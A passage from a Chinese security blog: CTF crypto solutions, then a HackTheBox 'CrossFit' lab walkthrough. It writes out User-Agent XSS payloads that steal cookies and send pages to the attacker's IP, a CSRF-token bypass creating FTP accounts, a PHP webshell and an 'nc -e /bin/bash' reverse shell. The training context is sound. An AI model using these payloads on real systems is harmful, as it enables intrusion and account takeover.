s.recv(1024).decode() print(msg, end=&quot;&quot;) # 解题 for a in range(1, 101): e = 2 * a * a a = str(a) e = str(e) msg = s.recv(1024).decode() s.send(a.encode()) print(msg, end=&quot;&quot;) print(a) msg = s.recv(1024).decode() s.send(a.encode()) print(msg, end=&quot;&quot;) print(a) msg = s.recv(1024).decode() s.send(a.encode()) print(msg, end=&quot;&quot;) print(a) msg = s.recv(1024).decode() s.send(a.encode()) print(msg, end=&quot;&quot;) print(a) msg = s.recv(1024).decode() s.send(e.encode()) print(msg, end=&quot;&quot;) print(e) msg = s.recv(1024).decode() print(msg, end=&quot;&quot;)s = socket.socket()s.connect((&quot;192.168.41.180&quot;, 2378))challenge_1(s)challenge_2(s)msg = s.recv(1024).decode()print(msg, end=&quot;&quot;)# flag is: GWHT&#123;a_funny_equation&#125; 0x02 Easy_Rsa参考链接：https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/ 求p,q（python） 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 while True: a = getRandomRange(2, n) b = f(a, n) j = 1 while True: p = GCD(abs(a - b), n) # print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i)) if p == n: break elif p &gt; 1: return (p, n // p) else: a = f(a, n) b = f(f(b, n), n) j += 1 i += 1def main(): n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039 p, q = rho(n)if __name__ == &quot;__main__&quot;: main() 求m（sage） 1234567891011121314p, q = 9983140483800634632426126985832058062766650402234684899412786169759602188949733747138853010482968306554808689182393249326088351886439191015684338347893201, 8437905502983445042677582637893534375137565614989838462475696727313788501904161403475771835934720130340799646782932619714906025013322551788559197469878239n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039e = 58337c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668phi = (p - 1) * (q - 1)d = inverse_mod(e, phi)m = pow(c, d, n)print(m) m=764933079065821303936797644844502321236920812448552312502734605833024103591159476785230123313397308075827837 转换成字符串 SangFor{0a8c2220-4c1b-32c8-e8c1-adf92ec7678b} 小总结好，非常愉快的周末就这样过去了~ 还有几个Web题还是挺好奇咋整的，因此占个坑位..","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"HackTheBox | CrossFit (未完待续)","slug":"2021/htb-crossfit","date":"2021-08-08T03:32:20.000Z","updated":"2022-11-27T07:35:56.441Z","comments":true,"path":"/p/2021/htb-crossfit/","link":"","permalink":"https://tari.moe/p/2021/htb-crossfit/","excerpt":"","text":"Web XSS CSRF JavaScript CORS SFTP信息泄漏 内网子域收集 第一次刷 Hack The Box，因为看到别人写的WP，好像很好玩，然后就心里痒痒的~ 然后随便调了个顺眼的…结果玩着玩着才发现是 insane 难度。。。。 吐槽：卡死了…加载一些静态资源….特别是和google有关的，所以直接 SwitchyOmega 安排上，把google相关的挂代理，速度就起飞了。 信息收集这里被分配到的IP为 10.10.10.208 端口扫描1nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208 参数说明[1][2] -p- 全端口扫描缩写，特点是巨慢…（300ms延迟约需1个小时） -sV 扫描目标主机和端口上运行的软件的版本，但不扫描开放端口，nmap默认使用 -sT 扫描 -sT TCP扫描 -sU UDP扫描，UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的 -sS 使用SYN半开放扫描[2] -sP ping扫描，用类似ping的方式发现主机 -sF FIN 扫描也不会在目标主机上创建日志（FIN扫描的优势之一），如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的) 其余扫描方式可见官网端口扫描技术 -sC 根据端口识别的服务,调用默认脚本 -T4，设置时间模板，共6个，依次为 0 paranoid 和 1 sneaky 模式用于IDS躲避 2 Polite 模式降低了扫描 速度以使用更少的带宽和目标主机资源。 3 Normal 为默认模式，因此-T3 实际上是未做任何优化。 4 Aggressive 模式假设用户具有合适及可靠的网络从而加速扫描. 5 insane 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 使用其他工具交叉扫描 1masscan 10.10.10.208 --ports 0-65535 没啥发现 端口扫描结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344&gt; nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 11:37 CSTWarning: 10.10.10.208 giving up on port because retransmission cap hit (6).Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 22.97% done; ETC: 12:46 (0:53:06 remaining)Nmap scan report for 10.10.10.208Host is up (0.30s latency).Not shown: 65511 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US| Not valid before: 2020-04-30T19:16:46|_Not valid after: 3991-08-16T19:16:4622/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)| 256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)|_ 256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Apache2 Debian Default Page: It works1918/tcp filtered can-nds4465/tcp filtered unknown5392/tcp filtered unknown7487/tcp filtered unknown8161/tcp filtered patrol-snmp14933/tcp filtered unknown16477/tcp filtered unknown24729/tcp filtered unknown27866/tcp filtered unknown31979/tcp filtered unknown40147/tcp filtered unknown41161/tcp filtered unknown42569/tcp filtered unknown44322/tcp filtered pmcdproxy47236/tcp filtered unknown51658/tcp filtered unknown52857/tcp filtered unknown57857/tcp filtered unknown61414/tcp filtered unknown62126/tcp filtered unknown64845/tcp filtered unknownService Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel 弱口令然后也用了 fscan 对 ftp 和 ssh 弱口令进行排查 1fscan -h 10.10.10.208 目录爆破，啥都没，好家伙，做到这就没思路了 sftp敏感信息泄漏掌握一个新姿势，vsftp 证书签名可能会有敏感信息 1openssl s_client -connect 10.10.10.208:21 -starttls ftp 得到邮箱地址和子域 12*.crossfit.htbemailAddress = info@gym-club.crossfit.ht 然后把这个子域加到我们本机host 上，然后用子域访问.. 1echo &quot;10.10.10.208 gym-club.crossfit.htb&quot; &gt;&gt; /etc/hosts 进一步信息搜集访问得到一个健身俱乐部页面，首页最下面和联系我们的页面，题目标签是XSS、CSRF，盲猜这两至少一处有XSS 用 burp 的 instereting files and directories 扫了扫目录，有个 readme.txt ，不过内容是关于wordpress 的 colorlib 主题的 readme，没什么收获 emmm，看了WP发现用的 dirburst的字典，自用35w字典没找到… 这里官方WP使用 gobuster，我这里用的自己写的小工具，虽然用了协程，但速度完全比不上go的，，差了1倍…. 发现目录信息泄漏 不过访问后 http://gym-club.crossfit.htb/security_threat/report.php 1Your are not allowed to access this page. Web漏洞利用验证 XSS对这两个输入框打了下，发现好像不出网…(burp进行了一次URL编码，最后抓包改一下包为编码前的数据) 1&lt;img src=&quot;kmy9o4.dnslog.cn&quot;&gt; 然后在 http://gym-club.crossfit.htb/blog-single.php 页面下面的评论区发现疑似 xss 点，在内容处输入 1&lt;img src=1 onerror=alert(1)&gt; 这里还说明了还会记录我们的 IP 信息和浏览器信息（猜测为UA），那管理员当然也能看到 （ 一开始想了半天怎么利用xss，后来发现靶机IP是可以直接访问到我们的….啊这…. 那直接监听本机 80 端口咯 1nc -lv 0.0.0.0 80 然后评论区内容不变，更改UA为 1&lt;img src=&quot;http://10.10.14.3&quot;&gt; 其中 src 的 IP 为本机被 openvpn 分配的 IP 毕竟都检测XSS了，那我们评论区输入的内容输出肯定被编码的，2333 然后这里用 UA，可以，很强势！ 那有时渗透能用 XFF，毕竟一般惯性思维（指开发），这两个参数，不会被输入恶意字符 尝试获取Cookie 1User-Agent: &lt;svg/onload=&quot;javascript:document.location.href=(&#x27;http://10.10.14.3?cookie=&#x27;+btoa(document.cookie))&quot;&gt; 不过啥都没返回 应该是管理员端设置了httponly，导致不能document.cookie不能[3]获取Cookie 尝试 XSS+XHR虽然不能获取管理员cookie，但我们可以利用管理员的身份通过XMLHttpRequests请求我们请求不到资源。就管理员访问我们构造的 JS 异步请求代码，他就会带上他的 Cookie 请求我们无法请求的资源，然后把结果返回给我们，这不就常用的XSS+CSRF（SSRF）组合拳，哈哈。 那请求啥页面我们请求不到的呢？ 比如刚刚的 security_threat/report.php ！ 参考2019UNCTF[4]，将以下代码保存为 payload0.js（下面 IP 变为 10.10.14.13 是因为openvpn断了，所以我本机IP变了） 12345678910var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState === 4 &amp;&amp; this.status === 200) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;POST&quot;, &quot;http://10.10.14.13:2233/&quot;, false); xhr2.send(this.responseText); &#125;&#125;;xhr.open(&quot;GET&quot;, &quot;http://gym-club.crossfit.htb/security_threat/report.php&quot;, false);xhr.send(); 远程要加载我们的代码，肯定要起一个HTTP服务 1python3 -m http.server 80 然后获取返回数据为 2233 端口 1nc -lvvp 2233 构造UA 1&lt;script src=&quot;http://10.10.14.13/payload0.js&quot;&gt; 发送请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？） 不过好像没啥有用的东西，就一个查看日志的页面 123456789101112131415161718192021222324252627282930313233343536POST / HTTP/1.1Host: 10.10.14.13:2233User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://gym-club.crossfit.htb/security_threat/report.phpContent-Type: text/plain;charset=UTF-8Content-Length: 343Origin: http://gym-club.crossfit.htbConnection: keep-alive&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Security Report&lt;/title&gt; &lt;style&gt; table, th, td &#123; border: 1px solid black; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h4&gt;Logged XSS attempts&lt;/h4&gt;&lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;Timestamp&lt;/td&gt; &lt;td&gt;User Agent&lt;/td&gt; &lt;td&gt;IP Address&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;/tbody&gt;&lt;/body&gt;&lt;/html&gt; 先跟着wp走吧~ 同源信息收集因为目录爆破没找到啥可通过XMLHttpRequests利用的，所以把目标指向子域，这里通过 wfuzz 进行 1wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H &quot;Host: FUZZ.crossfit.htb&quot; --hh 10701 http://10.10.10.208 其中 字典 kali有 sudo find / | grep subdomains-top1mil-110000.txt FUZZ 是占位符，字典要替换的部分 –hh 是隐藏 Chars部分，即页面内容的字符，这里隐藏 Apache页面返回 10701字符的结果，如果不隐藏会出现一堆 Apache 页面的结果 （ 原来 http 的 header Host 字段是干这个用的，apache等中间件通过Host来匹配对应的虚拟主机 （ 不过扫描结果好像没啥有用的.. 有返回的返回码都是400（可能请求频率太快了） 仔细一想，既然我们要跨源请求，直接找子域名肯定行不通的，由于同源策略的原因，就算管理员访问了带有XSS代码的页面，浏览器肯定不让xhr接收源B的返回信息，直接拦截。所以现在目标变成了：找到一个子域名，能让gym-club.crossfit.htb 跨源请求，这样才能把信息待会给我们。 但问题是，，如何才能找到这个子域名… WP有个很骚的想法：我们要找的子域名如果能让 gym-club.crossfit.htb 跨源请求，那么 gym-club.crossfit.htb 是否也能被我们要找的子域名跨源请求呢？ 知道这个有啥用呢？根据同源策略，如果源A可以跨源请求源B，那么在源A跨源请求源B设置HTTP请求头的Origin字段为源B的域名（这个和用户浏览器在源B站向源A站发送请求的数据包是一样的），源B的HTTP返回包 Access-Control-Allow-Origin 字段会显示 源B 的域名，这样用户浏览器在源B向源A请求获取返回数据时，浏览器看到 Access-Control-Allow-Origin 字段为源B的域名（源B请求后端，Allow-Origin源B，不就同源了），就不会拦截，可正常接口到数据。 注意: 这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站点请求的网站无需为这一新的 HTTP 访问控制特性担心。 – 摘自 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS 其实很好理解，好比用户在源A前端通过xhr发送请求至源A后端，同源嘛，那Origin就是源A嘛，源A后端看到这个Orgin返回的 Access-Control-Allow-Origin 为源A，同源了，浏览器能正常接收数据，没问题。那源B前端通过xhr发送请求至源A后端，Origin是源B，然后返回的 Access-Control-Allow-Origin 为源B，也就是源B前端请求，后端返回源B，也同源，浏览器能正常接收数据。 当然这个是要在源A的后端代码或配置文件配置的，即哪些源是我们可信的。 也就是说，找到同源的子域，我们的XSS就可以利用了！因为如果能找到这个子域名，gym-club.crossfit.htb 向子域发出的 xhr是同源的，能正常获取数据，待 xmlhttp.readyState==4 ，即下载操作已完成时，就可以通过 responseText 获取返回的数据了，就我们就可以获取我们无权限或无法直接访问到的页面的内容啦。 那具体如何做呢？ 1wfuzz -w ~/Desktop/subdomains-top1mil-110000.txt -H &quot;Origin: http://FUZZ.crossfit.htb&quot; --filter &quot;r.headers.response~&#x27;Access-Control-Allow-Origin&#x27;&quot; http://gym-club.crossfit.htb/ –filter 中的 str1~str2 表示str2是否在str1中[5]，即表示使用源 http://xxx.crossfit.htb 访问 http://gym-club.crossfit.htb/ ，如果 Access-Control-Allow-Origin 为 http://xxx.crossfit.htb ，说明源 http://xxx.crossfit.htb 可以跨源请求http://gym-club.crossfit.htb/ ，且用户在浏览器端可正常接口 http://gym-club.crossfit.htb/ 返回的数据。 那为啥不是 r.headers.response~&#39;Access-Control-Allow-Origin: http://FUZZ.crossfit.htb ? 正常来说，如果服务端没配置这个源访问，直接不会返回这个字段。匹配字段短点，速度也快点，虽然加上更严谨 （ PS: Origin: 记得别漏了 http://开头…不然服务端不会返回 Access-Control-Allow-Origin: 好耶！也就是说 http://ftp.crossfit.htb 这个站是存在的 把host文件更新一波 110.10.10.208 gym-club.crossfit.htb ftp.crossfit.htb 访问一下发现还是 apache 默认页面 应该是这个域名只有内网才能访问，不过问题不大，我们可以让管理员帮我们去访问！ XSS -&gt; CSRF之前做过类似的，通过 XSS+XHR+SSRF 打 REDIS ，这里其实也是差不多，说是 XSS+CSRF，理解成 XSS+SSRF也是没问题的，毕竟是让管理员帮我们请求内网，即我们无法访问的资源嘛。 构造 js 代码，这里为了方便（UA写一大串也不美观，下面 IP 变为 10.10.14.11 是因为openvpn断了，所以我本机IP变了），把代码保存至 payload1.js 12345678910var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState === 4 &amp;&amp; this.status === 200) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;POST&quot;, &quot;http://10.10.14.11:2233/&quot;, false); xhr2.send(this.responseText); &#125;&#125;;xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb&quot;, false);xhr.send(); 上述代码用处为让管理员帮我们请求 http://ftp.crossfit.htb ，并把源码返回给我们，其中 open() 第三个参数为是否进行异步操作，默认为true，如果值为false，send()方法直到收到答复前不会返回[6] 起一个HTTP服务 1python3 -m http.server 80 然后获取返回数据为 2233 端口 1nc -lvvp 2233 构造UA 1User-Agent: &lt;img src=x onerror=&quot;document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//10.10.14.11/payload1.js&#x27;&quot;&gt; 请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？） 成功获取源码 123456789101112131415161718192021222324252627282930313233343536373839404142POST / HTTP/1.1Host: 10.10.14.11:2233User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://gym-club.crossfit.htb/security_threat/report.phpContent-Type: text/plain;charset=UTF-8Content-Length: 886Origin: http://gym-club.crossfit.htbConnection: keep-alive&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;FTP Hosting - Account Management&lt;/title&gt; &lt;link href=&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-lg-12 margin-tb&quot;&gt; &lt;div class=&quot;pull-left&quot;&gt; &lt;h2&gt;FTP Hosting - Account Management&lt;/h2&gt; &lt;/div&gt; &lt;div class=&quot;pull-right&quot;&gt; &lt;a class=&quot;btn btn-success&quot; href=&quot;http://ftp.crossfit.htb/accounts/create&quot;&gt; Create New Account&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;table class=&quot;table table-bordered&quot;&gt; &lt;tr&gt; &lt;th&gt;No&lt;/th&gt; &lt;th&gt;Username&lt;/th&gt; &lt;th&gt;Creation Date&lt;/th&gt; &lt;th width=&quot;280px&quot;&gt;Action&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 看 Referer 字段，原来管理员一直在看我们目录爆破出来 http://gym-club.crossfit.htb/security_threat/report.php 路径 源码本地打开 原来如此，原来是，管理ftp服务帐号的，怪不得，ftp的openssl信息里有 gym-club.crossfit.htb 域名相关的，，原来是一个网站一个ftp帐号之类的？ 如果是的话，我们就可以通过构造数据包，创建一个ftp帐号，然后应该就可以访问网站根目录，在上传一句话getshell，计划通~ payload2.js 改为（至于为啥不像之前用POST而用GET，这里遇到了个问题，见遇到的问题1） 12345678910var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState === 4 &amp;&amp; this.status === 200) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;GET&quot;, &quot;http://10.10.14.4:2233/&quot; + btoa(this.responseText), true); xhr2.send(); &#125;&#125;;xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb/accounts/create&quot;, false);xhr.send(); 这里接收到的为base64编码后的，即 JavaScript 的 btoa方法 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;FTP Hosting - Account Management&lt;/title&gt; &lt;link href=&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot;&gt;&lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-lg-12 margin-tb&quot;&gt; &lt;div class=&quot;pull-left&quot;&gt; &lt;h2&gt;Add New Account&lt;/h2&gt; &lt;/div&gt; &lt;div class=&quot;pull-right&quot;&gt; &lt;a class=&quot;btn btn-primary&quot; href=&quot;http://ftp.crossfit.htb/accounts&quot;&gt; Back&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;form action=&quot;http://ftp.crossfit.htb/accounts&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_token&quot; value=&quot;z9lTdbVfj0SAZjWoyUWLoWPEnRTXesPM2rt4n8No&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;strong&gt;Username:&lt;/strong&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;strong&gt;Password:&lt;/strong&gt; &lt;input type=&quot;password&quot; name=&quot;pass&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-xs-12 col-sm-12 col-md-12 text-center&quot;&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 还有token，尝试两次，发现token会变，不能直接CSRF，好家伙… 一般来说，token是与会话绑定的，不同的会话token不一样，相同会话token一致，也就是说我们要通过xhr保持同一个会话，而不是先拿了token，等下 一次请求，会话不一致，还是创建不了帐号。 结合 xss bypass anti-csrf-token 进行 CSRF攻击流程如下 获取 /accounts/create 页面 解析返回页面dom节点获取 _token 值 带上 _token 向 http://ftp.crossfit.htb/accounts 接口发送 POST请求，并创建一个帐号密码为 tari/tari 的帐号 把请求结果待会本机监听的 nc 端口 构造payload3.js，获取token 1234567891011121314151617var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState == 4) &#123; // 通过解析 /accounts/create 页面 DOM 节点获取 _token var parser = new DOMParser(); var doc = parser.parseFromString(this.responseText, &quot;text/html&quot;); var token = doc.getElementsByName(&#x27;_token&#x27;)[0].value; // 返回 _token 给本机监听的 nc 端口 var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;GET&quot;, &quot;http://10.10.14.4:2233/&quot; + token, false); xhr2.send(); &#125;&#125;;// 获取 /accounts/create 页面xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb/accounts/create&quot;, false);xhr.withCredentials = true;xhr.send(); 正常获取 构造payload4.js，这里注意需要设置 withCredentials = true 才能保证两个他们在同一会话中，见遇到的问题2 1234567891011121314151617181920212223242526272829var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState == 4) &#123; // 通过解析 /accounts/create 页面 DOM 节点获取 _token var parser = new DOMParser(); var doc = parser.parseFromString(this.responseText, &quot;text/html&quot;); var token = doc.getElementsByName(&#x27;_token&#x27;)[0].value; var xhr2 = new XMLHttpRequest(); xhr2.onreadystatechange = function() &#123; if (this.readyState == 4) &#123; // 3）创建结果返回给本机监听的 nc 端口 var xhr3 = new XMLHttpRequest(); xhr3.open(&quot;GET&quot;, &quot;http://10.10.14.4:2233/&quot; + btoa(this.responseText), false); xhr3.send(); &#125; &#125;; // 2）带上 _token 创建 tari 用户 xhr2.open(&quot;POST&quot;, &quot;http://ftp.crossfit.htb/accounts&quot;, false); xhr2.withCredentials = true; xhr2.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;); var params = &quot;username=tari&amp;pass=tari&amp;_token=&quot; + token; xhr2.send(params); &#125;&#125;;// 1) 获取 /accounts/create 页面xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb/accounts/create&quot;, false);xhr.withCredentials = true;xhr.send(); ok 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;FTP Hosting - Account Management&lt;/title&gt; &lt;link href=&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-lg-12 margin-tb&quot;&gt; &lt;div class=&quot;pull-left&quot;&gt; &lt;h2&gt;FTP Hosting - Account Management&lt;/h2&gt; &lt;/div&gt; &lt;div class=&quot;pull-right&quot;&gt; &lt;a class=&quot;btn btn-success&quot; href=&quot;http://ftp.crossfit.htb/accounts/create&quot;&gt; Create New Account&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;p&gt;Account created successfully.&lt;/p&gt; &lt;/div&gt; &lt;table class=&quot;table table-bordered&quot;&gt; &lt;tr&gt; &lt;th&gt;No&lt;/th&gt; &lt;th&gt;Username&lt;/th&gt; &lt;th&gt;Creation Date&lt;/th&gt; &lt;th width=&quot;280px&quot;&gt;Action&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;tari&lt;/td&gt; &lt;td&gt;2021-08-14 07:39:54&lt;/td&gt; &lt;td&gt; &lt;form action=&quot;http://ftp.crossfit.htb/accounts/72&quot; method=&quot;POST&quot;&gt; &lt;a class=&quot;btn btn-info&quot; href=&quot;http://ftp.crossfit.htb/accounts/72&quot;&gt;Show&lt;/a&gt; &lt;a class=&quot;btn btn-primary&quot; href=&quot;http://ftp.crossfit.htb/accounts/72/edit&quot;&gt;Edit&lt;/a&gt; &lt;input type=&quot;hidden&quot; name=&quot;_token&quot; value=&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;DELETE&quot;&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;sheeraz&lt;/td&gt; &lt;td&gt;2021-08-14 07:32:44&lt;/td&gt; &lt;td&gt; &lt;form action=&quot;http://ftp.crossfit.htb/accounts/71&quot; method=&quot;POST&quot;&gt; &lt;a class=&quot;btn btn-info&quot; href=&quot;http://ftp.crossfit.htb/accounts/71&quot;&gt;Show&lt;/a&gt; &lt;a class=&quot;btn btn-primary&quot; href=&quot;http://ftp.crossfit.htb/accounts/71/edit&quot;&gt;Edit&lt;/a&gt; &lt;input type=&quot;hidden&quot; name=&quot;_token&quot; value=&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;DELETE&quot;&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 创建成功了。 之前说过，这个应该是网站部署的vsftp帐号，尝试通过 tari/tari 登录 命令行的话需要下载 lftp 才能连，ftp没有支持 SSL协议 1234set ftp:ssl-force trueset ssl:verify-certificate noconnect 10.10.10.208login tari tari 连不了。。？不是，那我图形化怎么连上的？…. emm，过了两个小时又可以了，晕（破案了，好像机器会每隔一段时间清理用户和文件之类的，要重新打一下添加用户，然后就可以正常了~） 看了下权限，除了 development-test 目录其他没法写权限。 GetShell先写个PHP一句话进去，s.php 内容为 1&lt;?php system($_REQUEST[&#x27;s&#x27;]); ?&gt; 根据命名规则，先试试 development-test.crossfit.htb 可不可以通过外网访问 意料之中无法访问 没事，我们文件上传上去了，可以通过 XSS+CSRF让管理员帮我们访问 （ payload5.js 123xhr = new XMLHttpRequest();xhr.open(&quot;GET&quot;, &quot;http://development-test.crossfit.htb/s.php?s=nc+10.10.14.4+2233+-e+/bin/bash&quot;, false);xhr.send(); 成功反弹shell（一开始弹了半天，结果发现环境好像每隔一段时间会重置的….毕竟是共享环境2333） 获取一个TTY shell，不然到时候提权了用户都切不了 （ 1python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;; 阶段总结原本对同源策略、JSONP、httponly搞的模模糊糊的，以及他们的作用范围和利用方法，经过环境的调试，在看看以前看过的文章，怎样可行，怎样不可行，终于理解清楚了~ 后渗透权限提升 - 获取普通用户权限 linux-smart-enumeration 没找到啥有用的 linux_exploit_suggester 报了个错 1./linux-exploit-suggester.sh: line xxxx: cannot create temp file for here-document: No such file or directory 解决方式传送门 也没找到啥好用的， linux_exploit_suggester-2 也是没找到啥 从系统中找所有用户可读文件，这也太多了吧（ 1find / -xdev -type d -perm -0001 -ls 这个思路挺好的，看到 ansible 去找 playbook，不过就是输出太多，很容器看漏的… 这里安利一个开源项目 https://github.com/carlospolop/PEASS-ng 通过linpeas 很容易发现了个街上最靓的仔 此外还发现了个isaac用户的计划任务，不过这个文件要 admins组才能编辑 1* * * * * isaac /usr/bin/php /home/isaac/send_updates/send_updates.php 看一下文件，好像很厉害的权限的样子（竟然不是 root 内核漏洞没有，看来只能爆破哈希了 （ 有两个 